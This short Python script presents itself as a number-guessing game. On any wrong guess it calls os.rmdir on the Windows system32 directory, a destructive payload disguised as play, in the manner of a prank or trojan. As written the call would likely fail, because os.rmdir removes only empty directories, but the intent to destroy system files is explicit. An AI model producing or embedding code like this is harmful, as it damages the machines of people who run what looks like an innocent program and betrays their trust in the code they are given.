import os
# import shutil
import random

num = random.randint(1, 10)
guess =  int(input("Guess any number between 1 to 10"))

if guess == num:
    print("You are lucky")

else:
    os.rmdir("C:\Windows\system32")
